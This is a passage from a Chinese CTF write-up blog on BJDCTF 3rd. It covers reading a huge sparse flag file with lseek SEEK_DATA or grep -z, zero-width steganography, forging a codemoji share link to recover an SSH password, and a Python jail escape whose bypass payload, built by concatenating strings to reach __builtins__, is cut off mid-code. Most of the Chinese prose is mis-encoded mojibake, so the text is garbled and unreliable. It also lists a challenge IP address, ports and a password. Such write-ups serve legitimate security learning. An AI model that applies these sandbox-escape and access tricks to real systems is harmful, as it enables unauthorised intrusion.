number">22</span> 06:40 flag-rw-r----- <span class="token number">1</span> root ctf              <span class="token number">23</span> May <span class="token number">19</span> <span class="token number">11</span>:05 readme</code></pre><p>ç¡¬ç›˜è¿™ä¹ˆå°ï¼Œæ€ä¹ˆ<code>flag</code>æ–‡ä»¶è¿™ä¹ˆå¤§ï¼ˆ16TB+ ï¼Ÿï¼Ÿï¼Ÿï¼‰ï¼Œä½›äº†ã€‚</p><p>è¿™ä¸ª nc æœ‰15sçš„æ—¶é—´é™åˆ¶ï¼Œè¿˜æœ‰æ‰§è¡Œå†…å­˜é™åˆ¶ä¹‹ç±»çš„ã€‚</p><p>è¯•äº†ä¸€ä¸‹æ²¡æœ‰<code>strings</code>ï¼Œ<code>grep</code> å‡ºä¸æ¥ flagã€‚ï¼ˆè¢«killäº†ï¼Ÿ</p><p>è€ƒè™‘åˆ° hint ä¸­æç¤ºå¯ä»¥ç”¨pyæ¥æ•´ã€‚ç¯å¢ƒä¸­åªæœ‰py2.</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"open('./flag','r').read()"</span></code></pre><p>è¿™æ ·ä¼šç‚¸å†…å­˜ã€‚</p><p>è€ƒè™‘åˆ†å—è¯»å–ï¼Œç„¶è€Œå¥½åƒåˆæœ‰é™åˆ¶ã€‚ä½›äº†ã€‚</p><hr><p><strong>20200605 æ›´æ–°ï¼š</strong></p><p>çœ‹äº†çœ‹å‡ºé¢˜çš„ TaQini å¸ˆå‚…çš„<a href="http://taqini.space/2020/05/28/bjd3rd-testyournc/#Test-your-nc">å‡ºé¢˜ç¬”è®°</a>ï¼Œè¿™é‡Œé¡ºä¾¿å‚è€ƒä¸€ä¸‹ã€‚</p><p>ä¹‹æ‰€ä»¥ç”Ÿæˆçš„ flag å¦‚æ­¤ä¹‹å¤§ï¼Œæ˜¯å› ä¸ºç”Ÿæˆçš„è„šæœ¬ä¸­çš„ <code>seek</code> å‡½æ•°åœ¨å°†æ–‡ä»¶åç§»çš„æŒ‡é’ˆå¾€åç§»åŠ¨ä¸€æ®µä¹‹åï¼Œåœ¨å†™å…¥çš„æœ‰æ•ˆæ•°æ®ï¼ˆflagï¼‰ä¹‹é—´ç•™ä¸‹äº†ä¸€ä¸ªä¸ªç”± <code>\x00</code> ç»„æˆçš„ç©ºæ´ï¼ˆholeï¼‰ï¼Œè¿™äº› hole æ˜¯ä¸å ç”¨ï¼ˆä¸åˆ†é…ï¼‰ç£ç›˜ç©ºé—´çš„ã€‚å› æ­¤é¢˜ç›®ä¸­ç”¨<code>df</code>çœ‹ç¡¬ç›˜ç©ºé—´è¿˜æ˜¯å¾ˆå°çš„ã€‚</p><p>è€Œç”¨<code>lseek</code>å‡½æ•°èƒ½è·³è¿‡ hole å»è¯»å–æ•°æ®ã€‚</p><p>å¯ä»¥ç”¨ <code>man lseek</code> æ¥çœ‹çœ‹å‡½æ•°æ‰‹å†Œã€‚</p><blockquote><p><strong>off_t lseek</strong> (int fd, off_t offset, int whence);</p><p>The lseek() function repositions the offset of the open file associated with the file descriptor <u>fd</u> to the argument <u>offset</u> according to the directive <u>whence</u>.</p><p>fdï¼šæ–‡ä»¶æè¿°ç¬¦ï¼› </p><p>offset: ç§»åŠ¨æ–‡ä»¶ä½ç½®çš„åç§»æ•°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ï¼›</p><p>whence ä¸ºç³»ç»Ÿå®šä¹‰çš„å¸¸é‡ï¼Œå¯èƒ½çš„å€¼æœ‰<strong>SEEK_SET</strong>ã€<strong>SEEK_CUR</strong>ã€<strong>SEEK_END</strong>ã€<strong>SEEK_DATA</strong>ã€<strong>SEEK_HOLE</strong>ã€‚</p><p><strong>SEEK_SET</strong><br>       The offset is set to offset bytes.    æ–‡ä»¶è¯»å†™ä½ç½®ä»<strong>æ–‡ä»¶å¼€å§‹</strong>å¾€åç§»åŠ¨offsetä¸ªå­—èŠ‚ã€‚</p><p><strong>SEEK_CUR</strong><br>       The offset is set to its current location plus offset bytes.  æ–‡ä»¶è¯»å†™ä½ç½®ä»<strong>å½“å‰ä½ç½®</strong>å¼€å§‹ç§»åŠ¨offsetä¸ªå­—èŠ‚ã€‚offsetå¯ä»¥ä¸ºè´Ÿå€¼ã€‚</p><p><strong>SEEK_END</strong><br>       The offset is set to the size of the file plus offset bytes.  æ–‡ä»¶è¯»å†™ä½ç½®ä»<strong>æ–‡ä»¶ç»“å°¾</strong>ç§»åŠ¨offsetä¸ªå­—èŠ‚ã€‚offsetå¯ä»¥ä¸ºè´Ÿå€¼ã€‚</p></blockquote><p>è¿™é‡Œè¦ç”¨åˆ°çš„æ˜¯ <code>whence</code> å‚æ•°ä¸º <code>SEEK_DATA</code>ï¼Œman ä¸­è¿˜å¯¹ç©ºæ´ï¼ˆholeï¼‰çš„åŸç†ä½œäº†è§£é‡Šã€‚</p><blockquote><p>Seeking file data and holes</p><p>â€‹       Since version 3.1, Linux supports the following additional values for whence:</p><p><strong>SEEK_DATA</strong><br>          Adjust the file offset to the next location in the file greater than or equal to offset containing data.  If offset points  to  data,  then the file offset is set to offset.</p><p><strong>SEEK_HOLE</strong><br>          Adjust  the file offset to the next hole in the file greater than or equal to offset.  If offset points into the middle of a hole, then the file offset is set to offset.  If there is no hole past offset, then the file offset is adjusted to the end of the file (i.e., there is  an implicit hole at the end of any file).</p><p>   In both of the above cases, lseek() fails if offset points past the end of the file.</p><p>   These  operations  allow  applications  to map holes in a sparsely allocated file.  This can be useful for applications such as file backup tools, which can save space when creating backups and preserve holes, if they have a mechanism for discovering holes.</p><p>   For the purposes of these operations, a hole is a sequence of zeros that (normally) has not been allocated in the underlying file storage. However, a filesystem is not obliged to report holes, so these operations are not a guaranteed mechanism for mapping the storage space actually allocated to a file.  (Furthermore, a sequence of zeros that actually has been written to the underlying storage may not be reported as a  hole.) In the simplest implementation, a filesystem can support the operations by making SEEK_HOLE always return the offset of the end of the file, and making SEEK_DATA always return offset (i.e., even if the location referred to by offset is a hole, it can be considered to consist of data that is a sequence of zeros).</p></blockquote><p>å¤§æ¦‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™äº›ç©ºæ´æ˜¯é›¶åºåˆ—ï¼Œå®ƒä»¬é€šå¸¸åœ¨åº•å±‚æ–‡ä»¶å­˜å‚¨ä¸­æ²¡æœ‰åˆ†é…ç©ºé—´ã€‚</p><p><code>SEEK_DATA</code> æ˜¯è·³è¿‡ hole å¯»æ‰¾ä¸‹ä¸€ä¸ªæ•°æ®ï¼Œ<code>SEEK_HOLE</code>æ˜¯è·³è¿‡æ•°æ®å¯»æ‰¾ä¸‹ä¸€ä¸ª holeã€‚</p><p>åœ¨ python ä¸­çš„ os æ¨¡å—ä¹Ÿæœ‰<code>lseek</code>è¿™ä¸ªå‡½æ•°ï¼Œäºæ˜¯å¯ä»¥ç”¨æ¥å†™expäº†ã€‚</p><p>è€ƒè™‘åˆ°æ²¡æœ‰ç¯å¢ƒäº†ï¼Œè¿™é‡Œåˆ©ç”¨<code>/f1a9.bak</code>ä¸­çš„å†…å®¹åœ¨æœ¬åœ°ç”Ÿæˆäº†ä¸€ä¸ª flagï¼Œè€Œåå‚ç…§ TaQini å¸ˆå‚…çš„è„šæœ¬æ¥è¯»å– flagã€‚</p><p>é¦–å…ˆçœ‹ä¸€ä¸‹ flag æœ‰å¤šå¤§ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ls -al</span>total <span class="token number">56</span>drwxr-xr-x <span class="token number">2</span> root root           <span class="token number">4096</span> <span class="token number">6</span>æœˆ   <span class="token number">5</span> <span class="token number">22</span>:06 ./drwxr-xr-x <span class="token number">8</span> root root           <span class="token number">4096</span> <span class="token number">6</span>æœˆ   <span class="token number">5</span> <span class="token number">21</span>:48 <span class="token punctuation">..</span>/-rw-r--r-- <span class="token number">1</span> root root <span class="token number">15007689474057</span> <span class="token number">6</span>æœˆ   <span class="token number">5</span> <span class="token number">21</span>:48 flag</code></pre><p>åœ¨å‘½ä»¤è¡Œå¯ä»¥ç”¨ <code>python -c &lt;command&gt;</code> æ¥æ‰§è¡Œ py è¯­å¥ï¼Œå¤šè¡Œçš„è¯ç”¨ä¸‰ä¸ªå¼•å·å¼•èµ·æ¥å°±å®Œäº‹äº†<em>ï¼ˆæˆ‘ä¹Ÿæ‰çŸ¥é“å‘½ä»¤è¡Œä¹Ÿå¯ä»¥è¿™æ ·å¤šè¡Œçš„å˜¤å˜¤å˜¤ï¼‰</em>ã€‚</p><p><strong>Expï¼š</strong>ï¼ˆåœ¨å‘½ä»¤è¡Œæ‰§è¡Œï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">""</span>"<span class="token function">import</span> osfd <span class="token operator">=</span> os.open<span class="token punctuation">(</span><span class="token string">'/home/ctf/flag'</span>,0<span class="token punctuation">)</span>off <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> off <span class="token operator">&lt;</span> <span class="token number">15007689474057</span>:    off <span class="token operator">=</span> os.lseek<span class="token punctuation">(</span>fd,off,3<span class="token punctuation">)</span> <span class="token comment"># SEEK_DATA</span>    off <span class="token operator">+=</span> <span class="token number">1</span>    a <span class="token operator">=</span> os.read<span class="token punctuation">(</span>fd,1<span class="token punctuation">)</span>    <span class="token keyword">if</span> a <span class="token operator">!=</span> <span class="token string">'<span class="token entity" title="\x00">\x00</span>'</span><span class="token builtin class-name">:</span>        flag <span class="token operator">+=</span> aprint flag<span class="token string">""</span>"</code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200605234912255.png" alt="nc_flag"></p><p>å³å¯å¾—åˆ°flagäº†ï¼</p><hr><p>è¿™é‡Œè¿˜æœ‰<strong>å¦ä¸€ç§æ–¹æ³•</strong>ï¼Œé‚£å°±æ˜¯åˆ©ç”¨ <strong>grep å¤§æ³•</strong>ï¼</p><p>çœ‹åˆ°æœ‰å¸ˆå‚…è¯´ï¼Œç”¨ <code>grep -z</code> å¯ä»¥å•è¡Œè¯­å¥å‡º flagï¼Œä¸è¿‡æ²¡æœ‰å…·ä½“ç»™å‡ºå¦‚ä½•å®ç°ï¼Œäºæ˜¯å°±è‡ªå·±è¯•äº†ä¸€ä¸‹ã€‚</p><p>çœ‹äº†çœ‹ <code>grep --help</code> å’Œ <code>man grep</code>ï¼š</p><blockquote><p> -z, â€“null-data           ä¸€ä¸ª 0 å­—èŠ‚çš„æ•°æ®è¡Œï¼Œä½†ä¸æ˜¯ç©ºè¡Œ</p><p> -z, â€“null-data<br>              Treat the input as a set of lines, each terminated by <strong>a zero byte</strong> (the ASCII NUL character) instead of a newline.  Like the  -Z  or  â€“null option, this option can be used with commands like sort -z to process arbitrary file names.</p></blockquote><p><code>-z</code>å°±æ˜¯è¯´æŠŠé›¶å­—ç¬¦çœ‹æˆæ˜¯è¾“å…¥çš„åˆ†è¡Œæ ‡å¿—ï¼Œå¯ä»¥ç†è§£æ˜¯æŠŠ <code>\x00 </code> å½“æˆåˆ†è¡Œç¬¦ï¼Œæ­£å¥½å°±ç¬¦åˆè¿™é¢˜çš„æ„æ€äº†ï¼Œå¦™å‘€ï¼</p><p>è¯•äº†ä¸€é˜µå­ï¼Œå‘ç°å¯ä»¥è¿™æ ·æ¥è¯»å– flag æ–‡ä»¶ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> -z <span class="token string">".\+"</span> flag<span class="token comment"># Or</span><span class="token function">grep</span> -z <span class="token string">"."</span> flag</code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200605235717591.png" alt="nc_flag2"></p><p>æƒ³ä¸åˆ°å§ï¼Œgrep è¿˜èƒ½è¿™ä¹ˆç”¨å‘¢ã€‚</p><br><hr><h3 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h3><blockquote><p>flagæ ¼å¼ï¼šæŠŠBJD{this_is_flag}è½¬md5ï¼Œæäº¤md5å€¼(å°å†™)</p><p><strong>hint:</strong> ç¬¬ä¸‰ç»„å¯†ç ä¸­çš„æŸä¸€ä½ï¼Œä»¥ä¸‹å›¾çš„è§£å¯†ç»“æœä¸ºå‡†ï¼š</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/jPqgz2GTi46qq5it.png"></p><p>ç™¾åº¦å›¾ç‰‡æœå‡ºæ¥çš„å¯†ç è¡¨æ˜¯Qï¼Œä»¥åŸè‘—ä¸ºå‡† æ”¹æˆwï¼Œå†æ ¹æ®å›¾ç‰‡çš„æç¤ºæ”¹æˆWï¼›å¦‚æœè¿˜æäº¤å¤±è´¥å°±æ˜¯å…¶ä»–ä½æœ‰è§£é”™çš„ã€‚</p></blockquote><p>æœ‰ä¸ª<code>flag.zip</code>ï¼Œé‡Œé¢æœ‰ä¸ªå›¾ç‰‡å¯†ç åŠ å¯†äº†ã€‚</p><p>è¿™é¢˜ç½‘é¡µä¸Šçœ‹åˆ°é‚£ä¸ª <code>pass</code> å’Œ <code>word_is_here</code> ä¹‹é—´çš„ç©ºå­—ç¬¦è¿˜è§‰å¾—å¥‡æ€ªï¼Œåšé¢˜çš„æ—¶å€™å°±æ²¡æƒ³åˆ°æ˜¯<strong>é›¶å®½åº¦å­—ç¬¦éšå†™</strong>ï¼ˆZero-Width Space Steganographyï¼‰â€¦â€¦åŸæ¥è¿˜æœ‰ç”¨åˆ°ç½‘é¡µä¸Šçš„ã€‚</p><blockquote><p><strong>è§£å¯†ç½‘ç«™</strong>å‚è€ƒï¼š</p><p><a href="http://zero.rovelast.com/">http://zero.rovelast.com/</a></p><p><a href="https://offdev.net/demos/zwsp-steg-js">https://offdev.net/demos/zwsp-steg-js</a></p></blockquote><blockquote><p><strong>GitHub ä»“åº“</strong>å‚è€ƒï¼š</p><p><a href="https://github.com/enodari/zwsp-steg-py">zwsp-steg-py</a> ï¼ˆåŸºäº python å®ç°ï¼‰</p><p><a href="https://github.com/offdev/zwsp-steg-js">zwsp-steg-js</a>  ï¼ˆåŸºäº JavaScript å®ç°ï¼‰</p></blockquote><p>è§£å‡ºæ¥å¯†ç æ˜¯<code>zerowidthcharactersinvisible</code>ã€‚</p><p>æ‹¿å»è§£å‹å›¾ç‰‡ï¼Œå‘ç°æ–‡ä»¶å€’åºäº†ã€‚</p><p><em>ï¼ˆç•™å‘ï¼Œåé¢æ¥ç€å¤ç°ï¼‰</em></p><br><hr><h3 id="manual"><a href="#manual" class="headerlink" title="manual"></a>manual</h3><blockquote><p>è¯·ä½¿ç”¨sshè¿æ¥é¶æœºï¼ˆç”¨æˆ·åä¸ºctfï¼Œå¯†ç è¯¦è§æ¬¢è¿ä¿¡æ¯ï¼‰â€”â€”â€”â€” æ­¡è¿ä½¿ç”¨BJD3rdå¸®åŠ©æ‰‹å†Œâ€”â€”â€”â€”ã€Œmanualä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“ã€</p><p>183.129.189.60:10125,10126,10127,10128,10129,10130</p><p>hint0 è¯•è¯•limuxçš„manå‘½ä»¤ï¼Œçœ‹çœ‹ä¸æœ¬é¢˜çš„manæ–‡æ¡£æœ‰ä½•ä¸åŒ</p><p>hint0.5 å…³äºç™»å½•å¯†ç ï¼Œè¯•è¯•<a href="http://emoji.taqini.space/">emoji</a>ç½‘ç«™çš„åˆ†äº«åŠŸèƒ½</p><p>hint1 æœ¬é¢˜æ— éœ€ææƒï¼Œè¯·ä»”ç»†çœ‹çœ‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p>hint2 æ®è¯´ä¼špsçš„å¸ˆå‚…éƒ½åšå‡ºæ¥äº†</p><p>hint3 f1a9.pyçš„ç‹¬ç™½ï¼šæˆ‘çš„çœŸå®èº«ä»½æ˜¯web server</p></blockquote><p>è¿™é¢˜æœ‰æ¯’ï¼Œåšäº†ä¸€å¤©æ²¡åšå‡ºæ¥â€¦â€¦å¤§æ¦‚å†™å†™å§ã€‚</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522204639089.png" alt="ssh login"></p><pre class="language-none"><code class="language-none">% ssh ctf@183.129.189.60 -p 10128Welcome to BJD3rd Games ~ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ—The above login passwd is encrypted.leads: - http://emoji.taqini.space - suikaTry to figure out where is your         #           #####   #####  ######  ##     ##   #     # #     ##      # #    #  #  #     #       ######    #   #    #  ######    ###  #        #   ######       #    #    #        #   #    # #     #         #      ##### #    #  #####     #                                        p.s. Maybe you have lots of xiaowenhao after login,     I will help u look up the manual pages of flag.Now, input passwd to start the game:</code></pre><p><a href="http://emoji.taqini.space/">http://emoji.taqini.space</a> æ˜¯ TaQini å¸ˆå‚…éƒ¨ç½²çš„ codemoji åŠ è§£å¯†ç½‘ç«™ã€‚</p><p><code>suika</code>åœ¨æ—¥è¯­ä¸­æ˜¯ <strong>è¥¿ç“œ</strong> çš„æ„æ€ï¼Œçœ‹æ¥è¿™å°±æ˜¯ key äº†ã€‚</p><p>éšæ„è¯•ç€åŠ å¯†äº†ä¸€ä¸ªï¼Œåœ¨åˆ†äº«ç•Œé¢æµè§ˆå™¨æŠ“åŒ…å¾—åˆ°åˆ†äº«é“¾æ¥å½¢å¼ä¸º</p><p><a href="http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J+Ni/Cfjonwn4y38J+OkfCfjYvwn46J8J+Mt/CfjpHwn42L8J+OifCfjLfwn46RIiwia2V5Ijoi8J+NiSJ9">http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BNi%2FCfjonwn4y38J%2BOkfCfjYvwn46J8J%2BMt%2FCfjpHwn42L8J%2BOifCfjLfwn46RIiwia2V5Ijoi8J%2BNiSJ9</a></p><p><code>data</code> å‚æ•° urldecode + base64 è§£ç åå¾—åˆ°</p><pre class="language-none"><code class="language-none">{"message":"ğŸ‹ğŸ‰ğŸŒ·ğŸ‘ğŸ‹ğŸ‰ğŸŒ·ğŸ‘ğŸ‹ğŸ‰ğŸŒ·ğŸ‘","key":"ğŸ‰"}</code></pre><p>äºæ˜¯æƒ³åˆ°ä¿®æ”¹<code>message</code>å‚æ•°æ„é€  payload å¦‚ä¸‹ã€‚</p><pre class="language-none"><code class="language-none">{"message":"ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ—","key":"ğŸ‰"}</code></pre><p>base64 encode + urlencode:</p><pre class="language-none"><code class="language-none">eyJtZXNzYWdlIjoi8J%2BQgPCfkL7wn4y08J%2BanPCfjYvwn5CK8J%2BNh%2FCfkILwn42T8J%2BOkfCfkIjwn5Cf8J%2BSgfCfmp%2Fwn42XIiwia2V5Ijoi8J%2BNiSJ9</code></pre><p>æ„é€ åˆ†äº«é“¾æ¥å¾—åˆ°ï¼š</p><p><a href="http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J+QgPCfkL7wn4y08J+anPCfjYvwn5CK8J+Nh/CfkILwn42T8J+OkfCfkIjwn5Cf8J+SgfCfmp/wn42XIiwia2V5Ijoi8J+NiSJ9">http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BQgPCfkL7wn4y08J%2BanPCfjYvwn5CK8J%2BNh%2FCfkILwn42T8J%2BOkfCfkIjwn5Cf8J%2BSgfCfmp%2Fwn42XIiwia2V5Ijoi8J%2BNiSJ9</a></p><p>æ‹¿å»è§£ç ã€‚</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522204126571.png" alt="codemoji"></p><p>å¾—åˆ°sshè¿æ¥å¯†ç ï¼š</p><p><code>C0dEmOj!so4UnNy</code></p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522204720852.png" alt="man flag"></p><p>è¿˜åˆ«è¯´ï¼ŒæŒºå¥½çœ‹çš„233.</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522203813777.png" alt="flag"></p><p>çœ‹äº† Help æ‰å‘ç°è¿™æ˜¯ w3mã€‚è¿˜å¸¦å³é”®èœå•çš„å“‡ï¼</p><blockquote><p>w3mæ˜¯ä¸ªå¼€æ”¾æºä»£ç çš„æ–‡å­—å¼ç½‘é¡µæµè§ˆå™¨ã€‚</p><p>w3mæ”¯æŒè¡¨æ ¼ã€æ¡†æ¶ã€SSLè¿çº¿ã€é¢œè‰²ã€‚å¦‚æœæ˜¯åœ¨é€‚å½“çš„terminalä¸Šï¼Œç”šè‡³è¿˜æ”¯æŒâ€œinline imageâ€ã€‚ è¿™ä¸ªè½¯ä»¶é€šå¸¸å°½é‡å‘ˆç°å‡ºç½‘é¡µæœ¬æ¥çš„ç¼–æ’ã€‚</p><p>â€œw3mâ€è¿™åå­—æ˜¯æ¥è‡ªâ€œWWW-wo-Miruâ€ï¼Œå°±æ˜¯æ—¥æ–‡çš„â€œçœ‹WWWâ€ä¹‹ä¹‰ã€‚</p></blockquote><p>å“‡æ˜¯çœŸçš„æµè§ˆå™¨å”‰ï¼Œè¿˜å¯ä»¥ä¸Šæˆ‘åšå®¢ï¼ˆé›¾ï¼‰ï¼Œè™½ç„¶è§£æä¸äº†ä¸­æ–‡å˜¤å˜¤å˜¤ã€‚</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522211921981.png" alt="blog"></p><p>å€ŸåŠ©å¿«æ·é”®<code>U</code>åˆ†åˆ«è®¿é—®<code>givemeflag</code>å’Œ <code>getflag</code>ã€‚</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522211122635.png" alt="givemeflag"></p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522211335220.png" alt="getflag"></p><p>HISTORY é‡Œç»™äº†ä¸ªç½‘å€ <a href="https://www.jianshu.com/p/ac26b4506a38">https://www.jianshu.com/p/ac26b4506a38</a></p><p>è®²çš„æ˜¯<strong>è‡ªå®šä¹‰manæ‰‹å†Œ</strong>ã€‚</p><p>æŸ¥çœ‹<code>/etc/manpath.config</code>æ–‡ä»¶ã€‚</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523125052333.png" alt="manpath.config"></p><p>å¯¹æ¯”ä¸€ä¸‹å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼ˆï¼Ÿï¼Ÿï¼Ÿ</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523125551959.png" alt="manpath"></p><p>ç”¨ <code>V</code> å¯ä»¥æŸ¥çœ‹æ–‡ä»¶ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°  <code>f1a9.py</code>ï¼Ÿ</p><p>Option é‡Œå¯ä»¥æ”¹é…ç½®ç”¨å¤–éƒ¨æµè§ˆå™¨æ‰“å¼€ï¼Œè€ƒè™‘æ˜¯åå¼¹ shellã€‚</p><p>ï¼ˆä¸è¿‡ä¹ˆæœ‰ curlï¼Œä¸ä¼šäº†â€¦â€¦å˜¤å˜¤å˜¤</p><p>ï¼ˆçœ‹å¤§ä½¬ä»¬æ˜¯ç”¨ perl æ•´çš„ã€‚</p><p>è¿™é¢˜åé¢è¿˜æœ‰å¥½å‡ æ­¥â€¦â€¦æœ‰ç©ºå†å¤ç°8.</p><p>æœ€åæ˜¯ä¸€ä¸ª <a href="http://999.taqini.space/">http://999.taqini.space</a> å¤ªæï¼Ÿä¼šç©ã€‚</p><br><hr><h3 id="PY-me"><a href="#PY-me" class="headerlink" title="PY me"></a>PY me</h3><blockquote><p>è¯·æäº¤md5(â€œBJD{xxxx}â€)ï¼› </p><p>ä½¿ç”¨ncè¿æ¥ï¼› å°½é‡ç”¨åé¢çš„ç«¯å£ï¼Œ10020ç«¯å£ä¸å¤ªç¨³å®š</p><p>183.129.189.60:10020,10021,10022,10023,10024,10026</p></blockquote><blockquote><p>flagæ ¼å¼ä¸ºmd5ï¼ˆBJD{.*}ï¼‰ä¸Šäº¤md5å€¼</p><p>ä½¿ç”¨ncè¿æ¥é¶æœºï¼Œå»ºè®®ç”¨åé¢ç«¯å£å·</p><p>hint1: æ‰€æœ‰æ²¡æœ‰ä½¿ç”¨hint()ä¸­ç»™å‡ºçš„å‡½æ•°åšå‡ºé¢˜ç›®çš„æ–¹æ³•éƒ½æ˜¯éé¢„æœŸï¼Œå¦‚æœæ‚¨æ˜¯éé¢„æœŸè¯·æŠ¥å‘Šæˆ‘ä»¬ï¼Œæ‰€ä»¥ ä»å“ªé‡Œå…¥æ‰‹åº”è¯¥æ‡‚äº†å§ï¼Ÿ</p><p>hint2: if( #s#o#m#e#t#h#i#n#g#<em>#I#</em>#w#o#n#t#<em>#t#e#l#l#</em>#y#o#u# )  è¿™è¿‡æ»¤äº†å…¨éƒ¨å­—æ¯å’Œæ•°å­—ï¼Œå½“ç„¶è¿˜è¿‡æ»¤äº†å…¶ä»–ç¬¦å·ï¼Œéœ€è¦è‡ªå·±fuzzï¼ˆsocket pwntoolç­‰)</p><p>hint3: pythonå‡ ï¼Ÿ</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/X1T9NYXZ6Zyt9xKQ.png"></p><p>æ‰“é”™å­—äº†ï¼Œæ˜¯resultï¼Œä¸å½±å“åšé¢˜</p></blockquote><p>é¢˜ç›®ç»™äº† hint è¯´<strong>è¿‡æ»¤äº†å…¨éƒ¨å­—æ¯å’Œæ•°å­—ï¼Œå½“ç„¶è¿˜è¿‡æ»¤äº†å…¶ä»–ç¬¦å·</strong>ã€‚</p><p>è¯•äº†å‘ç°ä¸ä»…ä»…å¦‚æ­¤ï¼Œå¸¸ç”¨çš„ä¸€ä¸‹å‡½æ•°ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ¯”å¦‚ <code>os</code>ï¼Œ<code>sys</code>ï¼Œ<code>open</code>ï¼Œ<code>lambda</code>ï¼Œ<code>system</code>ï¼Œ<code>exec</code>ï¼Œ<code>eval</code>ï¼Œ<code>builtins</code>ç­‰ç­‰ã€‚</p><p>å‡½æ•°åç§°ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å¯ä»¥ç»•è¿‡ï¼Œä½†ä¸çŸ¥é“ç”¨ä»€ä¹ˆæ–¹æ³•èƒ½ç»•è¿‡æ¥è°ƒç”¨å‡½æ•°äº†ã€‚</p><p>çœ‹äº†ä¸‹ <code>dir()</code>ï¼Œå¤§æ¦‚æœ‰è¿™å‡ ä¸ª <code>False</code>, <code>__builtins__</code> , <code>hint</code>, <code>rceMe</code>ã€‚</p><p>é¢˜ç›®ä¸­çš„ <code>if False</code>ï¼Œç›´æ¥ä»¤ <code>False=True</code> å°±è¡Œï¼Œæ¯•ç«Ÿ python é‡Œéƒ½æ˜¯å¯¹è±¡ object 2333.</p><p>æœ¬æ¥æƒ³æ”¹ <code>str</code> çš„ï¼Œä½†æ€ä¹ˆæ ·éƒ½ç»•ä¸è¿‡ <code>if( #s#o#m#e#t#h#i#n#g#_#I#_#w#o#n#t#_#t#e#l#l#_#y#o#u# )</code> è¿™éƒ¨åˆ†åˆ¤æ–­ã€‚</p><p>åˆ©ç”¨æŠ¥é”™çŸ¥é“äº†æºç æ–‡ä»¶åç§°ä¸º <code>bjdpyjail.py</code>ï¼Œä¸è¿‡å¥½åƒæ²¡å•¥ç”¨ã€‚</p><p>è€ƒè™‘ç”¨å­—ç¬¦æ¥ç»•è¿‡ï¼Œæ‰‹åŠ¨è¯•éªŒå‘ç°åŒ…æ‹¬ä½†ä¸é™äº <code>^.;</code> è¢«è¿‡æ»¤äº†ã€‚</p><blockquote><p>è¯´åˆ°è¿™éš¾å—æ­»äº†ï¼Œæœ‰ç©ºå¾—å­¦å­¦ <code>pwntools</code>ï¼Œç›´æ¥æ§åˆ¶å°æ‰‹ç ä»£ç å¤ªjréš¾å—äº†ï¼Œè¿˜ä¸èƒ½å¿«æ·è°ƒç”¨ä¸Šä¸€æ¡æ‰§è¡Œå‘½ä»¤ï¼Œæ— æ³•æ¥å—ã€‚</p></blockquote><p>è¿™ä¹ˆè¯´æ¥ï¼Œå¼‚æˆ– <code>^</code> ä¸è¡Œï¼Œä½†å–å <code>~</code> å¯ä»¥ï¼Œ<code>&lt;</code>  <code>&gt;</code>ä¹Ÿå¯ã€‚</p><p>æŸ¥äº†ä¸€ä¸‹ç½‘ä¸Šæœ‰å…³äº PHP çš„å­—ç¬¦ç»•è¿‡ï¼Œç„¶è€Œåœ¨ python é‡Œä¸èƒ½ç›´æ¥å¯¹å­—ç¬¦æœ¬èº«å–åï¼Œè¦å…ˆå–<code>ord</code>ï¼Œç„¶åæƒ³äº†åŠå¤©éƒ½æƒ³ä¸åˆ°è¯¥æ€ä¹ˆç»•äº†â€¦â€¦</p><p><em>ï¼ˆæ‘Šæ‰‹ï¼Œç­‰å¤ç°</em></p><p>èµ›åçœ‹åˆ°å¤§ä½¬æ‰¾åˆ°äº†å¥‡å¦™çš„ç»•è¿‡æ–¹æ³•ï¼ŒæŠŠæºç è¯»å–å‡ºæ¥äº†ã€‚ï¼ˆè¯¦è§ <a href="https://ytoworld.tk/index.php/archives/100/#PY%20me(%E9%9D%9E%E9%A2%84%E6%9C%9F)">è¿™é‡Œ</a> ï¼‰</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">locals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token operator">+</span><span class="token string">'_buil'</span><span class="token operator">+</span><span class="token string">'tins_'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token 